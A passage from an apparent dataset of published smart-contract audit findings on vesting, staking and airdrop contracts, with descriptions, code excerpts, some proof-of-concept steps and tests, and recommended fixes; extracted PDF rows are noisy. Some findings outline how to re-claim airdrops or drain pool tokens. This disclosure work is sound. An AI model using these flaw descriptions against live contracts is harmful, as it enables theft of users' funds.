.clone () , 364 user_reward_token_account_info .clone () , 365 authority_info .clone () , 366 farm_pool .nonce , 367 _pending 368 )?; 369 } 370 } 371 372 //deposit (stake lptoken ) 373 ifamount > 0 { 17 FINDINGS & TECH DETAILS 374 //transfer lptoken amount from user 'slptoken account to pool 'slptoken pool 375 Self ::token_transfer ( 376 farm_id_info .key, 377 token_program_info .clone () , 378 user_lp_token_account_info .clone () , 379 pool_lp_token_account_info .clone () , 380 user_transfer_authority_info .clone () , 381 farm_pool .nonce , 382 amount 383 )?; 384 385 //update user 'sdeposited balance 386 user_info .deposit_balance +=amount ; 387 } Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is of paramount importance to validate the fee, source and target token account addresses to match the intended ones in order to prevent users from stealing the tokens from the pool.",CropperFinance Farm Program,Halborn,HIGH,,,14,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf,solodit_reports,c5b982da19cb54a6bd08e8ff6e3ef8b6,2023-09-22 02:39:02,2024-10-14 21:56:20,1,,
729482,66f50b17fd3a0b129d20fae6db8a3463,CONTRACT LOCKED WHEN TRANSFERRING PRE-FUND,Halborn,2021-10-27,"Description: Calling transferPrefund onLighthouseProject to a project id whose prefund stage is not finished would set the internal transferredPrefund field to true , preventing the function to be called again. Furthermore, this method can be called with a none existing project id, locking the posibility to call transferPrefund for a future created project. Code Location: Listing 2: contracts/LighthouseProject (Lines 230,257) 229 function transferPrefund (uint256 id)external onlyOwner { 230 if(auctions [id].transferredPrefund ) { 231 return ; 232 } 233 234 uint256 cap; 235 uint256 amount ; 236 (cap,amount ) = prefundTotalPool (id); 237 238 if(amount <cap) { 239 //Weapply SCALER multiplayer ,ifthe cap isless than 100 240 //Itcould happen ifinvesting goes inNATIVE token . 241 uint256 scaledPercent = (cap -amount ) * SCALER / (cap * 15FINDINGS & TECH DETAILS SCALER / 100) ; 242 243 //allocation =10*SCALER /100 *SCALED percent ; 244 uint256 scaledTransferAmount = (prefunds [id]. scaledAllocation *scaledPercent / 100) / SCALER ; 245 246 auctions [id].scaledAllocation =auctions [id]. scaledAllocation +scaledTransferAmount ; 247 prefunds [id].scaledAllocation =prefunds [id]. scaledAllocation -scaledTransferAmount ; 248 249 uint256 scaledCompensationAmount = (prefunds [id]. scaledCompensation *scaledPercent / 100) / SCALER ; 250 251 auctions [id].scaledCompensation =auctions [id]. scaledCompensation +scaledCompensationAmount ; 252 prefunds [id].scaledCompensation =prefunds [id]. scaledCompensation -scaledCompensationAmount ; 253 254 emit TransferPrefund (id,scaledTransferAmount , scaledCompensationAmount ); 255 } 256 257 auctions [id].transferredPrefund =true ; 258 } Risk Level: Likelihood - 3 Impact - 5 Recommendations: The function should verify that the project exists and that its funding phase has already ended. 16FINDINGS & TECH DETAILS",Seascape - Lighthouse,Halborn,HIGH,,,16,4,5,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,solodit_reports,,2023-09-22 02:39:11,2024-10-14 21:57:10,1,,
729496,525371bf18b3859c1c42c33858b12bbd,[H-05] Claim airdrop repeatedly,Code4rena,2021-11-04,"# Handle

gpersoon


# Vulnerability details

## Impact
Suppose someone claims the last part of his airdrop via claimExact() of AirdropDistribution.sol
Then airdrop[msg.sender].amount will be set to 0.

Suppose you then call validate() again. 
The check ""airdrop[msg.sender].amount == 0"" will allow you to continue, because amount has just be set to 0.
In the next part of the function, airdrop[msg.sender] is overwritten with fresh values and airdrop[msg.sender].claimed will be reset to 0.

Now you can claim your airdrop again (as long as there are tokens present in the contract)

Note: The function claim() prevents this from happening via ""assert(airdrop[msg.sender].amount - claimable != 0);"", which has its own problems, see other reported issues.

## Proof of Concept
// https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L555-L563

function claimExact(uint256 _value) external nonReentrant {
        require(msg.sender != address(0));
        require(airdrop[msg.sender].amount != 0);
        
        uint256 avail = _available_supply();
        uint256 claimable = avail * airdrop[msg.sender].fraction / 10**18; //
        if (airdrop[msg.sender].claimed != 0){
            claimable -= airdrop[msg.sender].claimed;
        }

        require(airdrop[msg.sender].amount >= claimable); // amount can be equal to claimable
        require(_value <= claimable);                       // _value can be equal to claimable
        airdrop[msg.sender].amount -= _value;      // amount will be set to 0 with the last claim


// https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L504-L517
function validate() external nonReentrant {
        ...
        require(airdrop[msg.sender].amount == 0, ""Already validated."");
        ...
             Airdrop memory newAirdrop = Airdrop(airdroppable, 0, airdroppable, 10**18 * airdroppable / airdrop_supply);
             airdrop[msg.sender] = newAirdrop;
             validated[msg.sender] = 1;   // this is set, but isn't checked on entry of this function

## Tools Used

## Recommended Mitigation Steps
Add the following to validate() :
        require(validated[msg.sender]== 0, ""Already validated."");",Boot Finance,elprofesor|fr0zn|gpersoon|pauliax,HIGH,,"$50,000 USDC",0,0,0,https://github.com/code-423n4/2021-11-bootfinance-findings/issues/129,https://code4rena.com/reports/2021-11-bootfinance,,https://code4rena.com/contests/2021-11-boot-finance-contest,solodit_reports,2a8bccf05d5199887f4818998bf88d01,2023-09-22 02:39:13,2024-10-14 21:57:45,1,,Dexes|CDP|Services|Privacy
729545,efc486515a80850d79cce1403ecc6f6f,"[H-03] Beneficiary cant get fairSideConviction NFT unless they only claim once, and only after it’s fully vested",Code4rena,2021-11-09,"# Handle

WatchPug


# Vulnerability details

Based on the context, once the beneficiary claimed all their vesting tokens, they should get the `fairSideConviction` NFT.

However, in the current implementation, if the beneficiary has claimed any amounts before it's fully vested, then they will never be able to get the `fairSideConviction` NFT, because at L138, it requires the `tokenbClaim` to be equal to the initial vesting amount.

https://github.com/code-423n4/2021-11-fairside/blob/20c68793f48ee2678508b9d3a1bae917c007b712/contracts/token/FSDVesting.sol#L124-L142

```solidity=124
function claimVestedTokens() external override onlyBeneficiary {
    uint256 tokenClaim = calculateVestingClaim();
    require(
        tokenClaim > 0,
        ""FSDVesting::claimVestedTokens: Zero claimable tokens""
    );

    totalClaimed = totalClaimed.add(tokenClaim);
    lastClaimAt = block.timestamp;

    fsd.safeTransfer(msg.sender, tokenClaim);

    emit TokensClaimed(msg.sender, tokenClaim, block.timestamp);

    if (amount == tokenClaim) {
        uint256 tokenId = fsd.tokenizeConviction(0);
        fairSideConviction.transferFrom(address(this), msg.sender, tokenId);
    }
}
```

### Recommendation

Change to:

```solidity=124
function claimVestedTokens() external override onlyBeneficiary {
    uint256 tokenClaim = calculateVestingClaim();
    require(
        tokenClaim > 0,
        ""FSDVesting::claimVestedTokens: Zero claimable tokens""
    );

    totalClaimed = totalClaimed.add(tokenClaim);
    lastClaimAt = block.timestamp;

    fsd.safeTransfer(msg.sender, tokenClaim);

    emit TokensClaimed(msg.sender, tokenClaim, block.timestamp);

    if (amount == totalClaimed) {
        uint256 tokenId = fsd.tokenizeConviction(0);
        fairSideConviction.transferFrom(address(this), msg.sender, tokenId);
    }
}
```",FairSide,WatchPug|cmichel,HIGH,Wrong Math,"$30,000 worth of ETH",0,4,3,https://github.com/code-423n4/2021-11-fairside-findings/issues/62,https://code4rena.com/reports/2021-11-fairside,,https://code4rena.com/contests/2021-11-fairside-contest,solodit_reports,ae5f5500f15d19207880636eaaf3ab32,2023-09-22 02:39:17,2024-10-14 21:58:33,1,,Dexes|CDP|Services|Cross Chain|Liquidity manager
729548,b1e068e039554fe529741d38679a73a3,[H-02] FSDVesting: Claiming tributes should call FSD token’s corresponding functions,Code4rena,2021-11-09,"# Handle

hickuphh3


# Vulnerability details

## Impact

The claiming of staking and governance tributes for the a beneficiary's vested tokens should be no different than other users / EOAs. However, the `claimTribute()` and `claimGovernanceTribute()` are missing the actual claiming calls to the corresponding functions of the FSD token contract. As a result, the accrued rewards are taken from the beneficiary's vested token while not claiming (replenishing) from the FSD token contract.

## Recommended Mitigation Steps

In addition to what has been mentioned above, the internal accounting for claimedTribute states can be removed because they are already performed in the FSD token contract.

```jsx
// TODO: Remove _claimedTribute and _claimedGovernanceTribute mappings

/**
* @dev Allows claiming of staking tribute by `msg.sender` during their vesting period.
* It updates the claimed status of the vest against the tribute
* being claimed.
*
* Requirements:
* - claiming amount must not be 0.
*/
function claimTribute(uint256 num) external onlyBeneficiary {
    uint256 tribute = fsd.availableTribute(num);
    require(tribute != 0, ""FSDVesting::claimTribute: No tribute to claim"");
		fsd.claimTribute(num);
    fsd.safeTransfer(msg.sender, tribute);
    emit TributeClaimed(msg.sender, tribute);
}

/**
* @dev Allows claiming of governance tribute by `msg.sender` during their vesting period.
* It updates the claimed status of the vest against the tribute
* being claimed.
*
* Requirements:
* - claiming amount must not be 0.
*/
function claimGovernanceTribute(uint256 num) external onlyBeneficiary {
  uint256 tribute = fsd.availableGovernanceTribute(num);
  require(
    tribute != 0,
    ""FSDVesting::claimGovernanceTribute: No governance tribute to claim""
  );
  fsd.claimGovernanceTribute(num);
  fsd.safeTransfer(msg.sender, tribute);
  emit GovernanceTributeClaimed(msg.sender, tribute);
}
```",FairSide,hickuphh3|leastwood,HIGH,,"$30,000 worth of ETH",0,0,0,https://github.com/code-423n4/2021-11-fairside-findings/issues/28,https://code4rena.com/reports/2021-11-fairside,,https://code4rena.com/contests/2021-11-fairside-contest,solodit_reports,ae5f5500f15d19207880636eaaf3ab32,2023-09-22 02:39:17,2024-10-14 21:58:34,1,,Dexes|CDP|Services|Cross Chain|Liquidity manager
729574,0c6b5b0affbea0d9f3294f6393c103e3,INVESTOR MULTI-WITHDRAW IF ADDED AGAIN,Halborn,2021-11-19,"Description: The addInvestor function, called only by the owner, does not check if the investor does have claimed already the tokens. The only performed check is the remainingCoins == 0 which will be true after the vesting period finishes (150 days for strategic and 300 days for private). When the vesting period finishes, the owner can call addInvestor , this will reset the remainingCoins for the investor. Having the reset the amount of remaining tokens allows the investor to withdraw again the max amount of tokens. This is possible since the getDuration function will return the total duration ( startTime did not change), allowing to re-claim the total tokens again. This process can be repeated. POC: •Add an investor with addInvestor •Wait for the vesting period to finish (150/300 days) •Withdraw the tokens using the investor account •Owner can call again the addInvestor function •Withdraw the tokens again Code Location: Listing 1: contracts/MscpVesting (Lines 51) 50function addInvestor (address _investor ,bool _strategicInvestor ) external onlyOwner { 51 require (balances [_investor ].remainingCoins == 0, ""investor already has allocation ""); 52 53 if(_strategicInvestor ){ 11FINDINGS & TECH DETAILS Figure 1 :PoC showing the double withdraw 54 balances [_investor ].remainingCoins =TOTAL_STRATEGIC ; 55 balances [_investor ].strategicInvestor =true ; 56 }else 57 balances [_investor ].remainingCoins =TOTAL_PRIVATE ; 58 59 emit InvestorModified (_investor ,balances [_investor ]. remainingCoins ); 60} Risk Level: Likelihood - 3 Impact - 5 Recommendation: Check if the investor already has claimedBonus tokens. If this value is different from zero, it means that the investor is already vested. 12FINDINGS & TECH DETAILS",Seascape - MSCP Token & Vesting,Halborn,HIGH,,,12,4,5,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,solodit_reports,,2023-09-22 02:39:20,2024-10-14 21:59:06,1,,
729586,3612a1ca89d6829d49f842243d6af37e,CLAIMING TOKENS BEFORE UNLOCKTIME LEADS UNCLAIM OF LOCKED TOKENS,Halborn,2021-11-23,"Description: The createClaim method on the contract which can to create claim for beneficiary users is vulnerable to unclaimed tokens. If any user tries to claim their rewards before reaching to _unlockTime ’s timestamp variable, the isActive field changes to false . The contract does not have any method to convert the isActive field to true from false . Therefore, users will not be able to get their unlocked amounts as rewards if they try to claim awards before their _unlockTime . For example, the contract admin creates a claim with following variables: Listing 6: Create Claim Example 1_beneficiary =""0x...... "", 2_vestAmount =""1Test Token "", 3_unlockAmount =""200 Test Token "", 4_unlockTime =current_timestamp + 1 day, 5_startTime = 0, 6_endTime =current_timestamp + 1 minute If user tries to claim awards after current_timestamp + 1 day, that user will get only 201 Test Tokens. However, if the user tries to claim awards before _unlockTime , user will get only 1 Test Token, the isActive field will be set to false by contract and it will not be possible to change it to true even timestamp reaches to _unlockTime . As a result, 200 Test Tokens will be stuck on the contract. 18FINDINGS & TECH DETAILS Code Location: Listing 7: BicoVestingFlat.sol (Lines 1285) 1278 function claim ()external whenNotPaused nonReentrant { 1279 address beneficiary =msg.sender ; 1280 Claim memory _claim =claims [beneficiary ]; 1281 require (_claim .isActive ,""CLAIM_INACTIVE ""); 1282 uint256 unclaimedAmount =claimableAmount (beneficiary ); 1283 ERC20 (tokenAddress ).transfer (beneficiary ,unclaimedAmount ) ; 1284 _claim .amountClaimed =_claim .amountClaimed + unclaimedAmount ; 1285 if(_claim .amountClaimed ==_claim .vestAmount )_claim . isActive =false ; 1286 claims [beneficiary ] = _claim ; 1287 emit Claimed (beneficiary ,unclaimedAmount ); 1288 } Risk Level: Likelihood - 4 Impact - 4 Recommendations: It is recommended to implement another check to validate the following formula. Listing 8: Formula 1_unlockTime <_startTime <_endTime 19FINDINGS & TECH DETAILS",Biconomy Vesting  Audit,Halborn,HIGH,,,19,4,5,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity%20Smart%20Contract%20Audits/Biconomy_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf,solodit_reports,,2023-09-22 02:39:20,2024-10-14 22:01:25,1,,
729881,8d8d2ce52dd3080efe60288e982dee2f,[H-01] Wrong reward token calculation in MasterChef contract,Code4rena,2022-02-03,"_Submitted by throttle, also found by cccz, cmichel, and leastwood_

[MasterChef.sol#L86](https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L86)<br>

When adding new token pool for staking in MasterChef contract

```javascript
function add(address _token, uint _allocationPoints, uint16 _depositFee, uint _startBlock)
```

All other, already added, pools should be updated but currently they are not.<br>
Instead, only totalPoints is updated. Therefore, old (and not updated) pools will lose it's share during the next update.<br>
Therefore, user rewards are not computed correctly (will be always smaller).

### Proof of Concept

Scenario 1:

1.  Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100)<br>
    and 1 block later Alice stakes 10 tokens in the first pool.
2.  1 week passes
3.  Alice withdraws her 10 tokens and claims X amount of reward tokens.<br>
    and 1 block later Bob stakes 10 tokens in the first pool.
4.  1 week passes
5.  Owner adds new pool (second pool) for staking with points = 100 (totalPoints=200)<br>
    and 1 block later Bob withdraws his 10 tokens and claims X/2 amount of reward tokens.<br>
    But he should get X amount

Scenario 2:

1.  Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100).
2.  1 block later Alice, Bob and Charlie stake 10 tokens there (at the same time).
3.  1 week passes
4.  Owner adds new pool (second pool) for staking with points = 400 (totalPoints=500)
5.  Right after that, when Alice, Bob or Charlie wants to withdraw tokens and claim rewards they will only be able to claim 20% of what they should be eligible for, because their pool is updated with 20% (100/500) rewards instead of 100% (100/100) rewards for the past week.

### Recommended Mitigation Steps

Update all existing pools before adding new pool. Use the massUdpate() function which is already present ... but unused.

**[ryuheimat (Concur) confirmed](https://github.com/code-423n4/2022-02-concur-findings/issues/219)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-02-concur-findings/issues/219#issuecomment-1092858699):**
 > The warden has identified a fallacy in how `add`s logic work.
> 
> Ultimately rewards in this contract have to be linearly vested over time, adding a new pool would change the rate at which vesting in all pools will go.
> 
> For that reason, it is necessary to accrue the rewards that each pool generated up to that point, before changing the slope at which rewards will be distributed.
> 
> In this case add should massUpdateFirst.
> 
> Because this vulnerability ultimately breaks the accounting of the protocol, I believe High Severity to be appropriate.



***",Concur Finance,cccz|leastwood|cmichel|throttle,HIGH,Wrong Math|Admin|Update State After Admin Action,"$75,000 USDC",0,4,3,https://github.com/code-423n4/2022-02-concur-findings/issues/219,https://code4rena.com/reports/2022-02-concur,,https://code4rena.com/contests/2022-02-concur-finance-contest,solodit_reports,e3353141a0d3aafc4dc9349f3f45bbf2,2023-09-22 02:39:48,2024-10-14 22:06:42,1,"function add(address _token, uint _allocationPoints, uint16 _depositFee, uint _startBlock) public onlyOwner {",Liquid Staking|CDP|Yield|Services|Cross Chain
730085,fe30369e7b2d4edb9bf21b476ae54515,MosaicVault and MosaicHolding owner has excessive privileges,TrailOfBits,2022-03-01,"Diﬃculty:  High

Type: Data Validation

Target:  CrosslayerPortal
Description
The owner of the  MosaicVault  and  MosaicHolding  contracts  has too many privileges
across the system. Compromise of the owner’s private key would put the integrity of the
underlying system at risk.
The owner of the  MosaicVault  and  MosaicHolding  contracts  can perform the following
privileged operations in the context of the contracts:
●
●
●
●
●
●
Rescuing funds if the system is compromised
Managing withdrawals, transfers, and fee payments
Pausing and unpausing the contracts
Rebalancing liquidity across chains
Investing in one or more investment strategies
Claiming rewards from one or more investment strategies
The ability to drain funds, manage liquidity, and claim rewards creates a single point of
failure. It increases the likelihood that the contracts’ owner will be targeted by an attacker
and increases the incentives for the owner to act maliciously.
Exploit Scenario
Alice, the owner of  MosaicVault  and  MosaicHolding  ,  deploys the contracts.
MosaicHolding  eventually holds assets worth USD 20  million. Eve gains access to Alice’s
machine, upgrades the implementations, pauses  MosaicHolding  ,  and drains all funds
from the contract.
Recommendations
Short term, clearly document the  functions and implementations  that the owner of the
MosaicVault  and  MosaicHolding  contracts can change.  Additionally,  split the privileges
Trail of Bits
31
Advanced Blockchain Security  Assessment
PUBLIC
provided to the owner across multiple roles  (e.g., a fund manager, fund rescuer, owner,
etc.) to ensure that no one address has excessive control over the system.
Long term, develop user documentation on all risks associated with the system, including
those associated with privileged users and the existence of a single point of failure.
Trail of Bits
32
Advanced Blockchain Security  Assessment
PUBLIC",Advanced Blockchain,Nat Chin|Troy Sargent|Anish Naik,HIGH,,,32,0,0,,https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchainQ12022.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/AdvancedBlockchainQ12022.pdf,https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchainQ12022.pdf,solodit_reports,cf1851201ab39b28439631760154f7ea,2023-09-22 02:40:06,2024-10-14 22:10:09,1,,
730600,7426584f2b937608cfa5b952d55f75f4,[H-03] MerkleVesting withdrawal does not verify that tokens were transferred successfully,Code4rena,2022-05-04,"# Lines of code

https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleVesting.sol#L173


# Vulnerability details

Across the codebase, the protocol is usually checking that ERC20 transfers have succeeded by checking their return value.
This check is missing in MerkleVesting's `withdraw` function.

## Impact
If for some reason the ERC20 transfer is temporarily failing, the user would totally lose his allocation and funds.
All the state variables would already have been updated at this stage, so he can't call `withdraw` again.
There is no way to withdraw these locked tokens.

## Proof of Concept
At the last point of `withdraw`, the function [is sending](https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleVesting.sol#L173) the funds to the user, and does not check the return value - whether it has succeeded:
```
        IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);
```
Note that this is (nicely and rightfully) done after all the state variables have been updated.
As the return value of the external call is not checked, if it has failed, the contract wouldn't know about it, and the function will finish ""successfully"".

## Recommended Mitigation Steps
As done throughout the rest of the protocol, add a check that verifies that the transfer has succeeded.",FactoryDAO,kenzo|IllIllI,HIGH,,"$50,000 DAI",0,2,4,https://github.com/code-423n4/2022-05-factorydao-findings/issues/130,https://code4rena.com/reports/2022-05-factorydao,,https://code4rena.com/contests/2022-05-factorydao-contest,solodit_reports,ea72ddbf1bdcacf2ccc96f783a4c4b91,2023-09-22 02:40:51,2024-10-14 22:26:29,1,"IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);",Dexes|CDP|Yield|RWA|Leveraged Farming
730961,acb482a2ae20c4a758dee53506246026,[H-09] Calling `unstake()` can cause locked funds,Code4rena,2022-06-14,"_Submitted by Ruhum, also found by 0xDjango, auditor0517, dipp, GimelSec, GreyArt, p4st13r4, and wagmi_

Following scenario:

Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.

### Proof of Concept

First, here's a test showcasing the issue:

```js
  describe('should cause trouble', () => {
    it('should lock up funds', async function () {
      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);
      await infinityStaker.connect(signer1).stake(amountStaked, 2);
      await network.provider.send(""evm_increaseTime"", [181 * DAY]);
      await network.provider.send('evm_mine', []);
      
      // The funds we staked for 6 months have vested
      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);

      // Now we want to stake funds for three months
      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);
      await infinityStaker.connect(signer1).stake(amountStaked2, 1);

      // total staked is now the funds staked for three & six months
      // total vested stays the same
      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));
      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);

      // we unstake the funds that are already vested.
      const userBalanceBefore = await token.balanceOf(signer1.address);
      await infinityStaker.connect(signer1).unstake(amountStaked);
      const userBalanceAfter = await token.balanceOf(signer1.address);

      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));

      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));
      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));
    });
  });
```

The test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.

The issue is in the `_updateUserStakedAmounts()` function:

```sol
    if (amount > noVesting) {
      userstakedAmounts[user][Duration.NONE].amount = 0;
      userstakedAmounts[user][Duration.NONE].timestamp = 0;
      amount = amount - noVesting;
      if (amount > vestedThreeMonths) {
        // MAIN ISSUE:
        // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.
        // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.
        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;
        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;
        amount = amount - vestedThreeMonths;
        // `amount == vestedSixMonths` so we enter the else block
        if (amount > vestedSixMonths) {
          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;
          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;
          amount = amount - vestedSixMonths;
          if (amount > vestedTwelveMonths) {
            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;
            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;
          } else {
            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;
          }
        } else {
          // the staked amount is set to `0`.
          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;
        }
      } else {
        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;
      }
    } else {
      userstakedAmounts[user][Duration.NONE].amount -= amount;
    }
```

### Recommended Mitigation Steps

Don't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)

**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1163063584)**

**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1179743567):**
 > When unstaking, unvested tokens may become locked in the contract forever.
> 
> Accepting this as a High risk issue.



***",Infinity NFT Marketplace,GreyArt|Ruhum|GimelSec|0xDjango|p4st13r4|auditor0517|dipp|wagmi,HIGH,,"$50,000 USDC",0,0,0,https://github.com/code-423n4/2022-06-infinity-findings/issues/50,https://code4rena.com/reports/2022-06-infinity,,https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest,solodit_reports,37b55b8a5a1e3ea85228627ea3f2097f,2023-09-22 02:41:21,2024-10-14 22:39:24,1,,Dexes|Cross Chain|Payments|NFT Marketplace|Gaming
731632,528102f773ba12e91e29d45c0a87dac3,[H-01] Loss of vested amounts,Code4rena,2022-09-20,"# Lines of code

https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L418
https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L147-L151
https://github.com/code-423n4/2022-09-vtvl/blob/f68b7f3e61dad0d873b5b5a1e8126b839afeab5f/contracts/VTVLVesting.sol#L364


# Vulnerability details

## Impact

Vesting is a legal term that means the point in time where property is earned or gained by some person.
The VTVLVesting contract defines:
- a start time (Claim::startTimestamp) and an end time (Claim::endTimestamp) at which vesting starts and ends for a entitled user
- the calculated points in time when the fractions of the total amount are released and therefore can be withdrawn (which are defined by Claim::releaseIntervalSecs).
The entitled user can either withdraw after each interval elapses, or after the whole vesting period is over or any variant of the two options.

The administrator of the contract can revoke the claim for a user at any time, which for vesting assets is expected. For example an employee with a vesting stock allocation of 1000 shares vesting at each quarter over a period of 4 years, may resign after 2 years and therefore the only half of the shares would be vested and therefore sold by the employee. The employee can either sell them at each quarter, or before, or after resigning, in any case the half of the shares have vested and are by legal right owned by the employee.

The VTVLContract revoke has the following defects:
- it ignores the amount already vested and now yet withdrawn
- if called, say half-way the total period, just after claimer withdraws the already vested amount, it revokes only the right to vest the remaining part in future.
- if called, say half-way the total period, right before the claimer withdraws the already vested amount, it revokes both the already vested amount and the right to vest the remaining part in future.

Raising as high impact because it actually causes:
- loss of already vested amounts of a user with a valid claim that has already righteously vested a part but not withdrawn
- different outcomes depending on the order in which withdraw and revokeClaim functions are called which means that one of the two behavoiurs is certainly in conflict with the other causing a loss on one of the two sides, contract or claimer (by definition of Vesting rights, the claimer).
- lack of trust by the potential claimers/users whch can be at any time deprived of righteously vested amounts.

## Proof of Concept

The following two tests prove the behaviour difference when the order by which revokeClaim vs withdraw are called, whch shows that the vesting right is not guaranteed.

```solidity
  // NOTE: USES ORIGINAL REVOKE BEHAVIOUR
  it('sample revoke use case USER LOSE: employee withdraw immediately after resignation', async () => {
    const {tokenContract, vestingContract} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});

    const startTimestamp = await getLastBlockTs() + 100;
    const endTimestamp = startTimestamp + 2000;
    const terminationTimestamp = startTimestamp + 1000 + 50; // half-way vesting, plus half release interval which shall be discarded
    const releaseIntervalSecs = 100;

    await vestingContract.createClaim(owner2.address, startTimestamp, endTimestamp, cliffReleaseTimestamp, releaseIntervalSecs, linearVestAmount, cliffAmount);

    // move clock to termination timestamp (half-way the vesting period plus a bit, but less than release interval seconds)
    await ethers.provider.send(""evm_mine"", [terminationTimestamp]);
    
    let availableAmt = await vestingContract.claimableAmount(owner2.address)
    // revoke the claim preserving the ""already vested but not yet withdrawn amount""
    await (await vestingContract.revokeClaim(owner2.address)).wait();
    
    let userBalanceBefore = await tokenContract.balanceOf(owner2.address);
    await expect(vestingContract.connect(owner2).withdraw()).to.be.revertedWith('NO_ACTIVE_CLAIM');
    let userBalanceAfter = await tokenContract.balanceOf(owner2.address);

    // move the clock to the programmed end of vesting period
    await ethers.provider.send(""evm_mine"", [endTimestamp]);

    // cliffTimestamp < startTimestamp < terminationTimestamp, hence expected cliffAmount + (1/2 * anlinearVestAmount)
    let expectedVestedAmount = cliffAmount.add(linearVestAmount.div(2));

    // RESIGNING EMPLOYEE LOSES HIS VESTED AMOUNT BECAUSE OF WITHDRAWING IMMEDIATELY AFTER RESIGNATION
    expect(userBalanceAfter.sub(userBalanceBefore)).to.be.equal(0);
    // VTVLVesting CONTRACT TOOK ALREADY VESTED AMOUNT FROM OWNER2
    expect(await vestingContract.finalClaimableAmount(owner2.address)).to.be.equal(0);
  });

  // NOTE: USES ORIGINAL REVOKE BEHAVIOUR
  it('sample revoke use case USER WIN: employee withdraw immediately before resignation', async () => {
    const {tokenContract, vestingContract} = await createPrefundedVestingContract({tokenName, tokenSymbol, initialSupplyTokens});

    const startTimestamp = await getLastBlockTs() + 100;
    const endTimestamp = startTimestamp + 2000;
    const terminationTimestamp = startTimestamp + 1000 + 50; // half-way vesting, plus half release interval which shall be discarded
    const releaseIntervalSecs = 100;

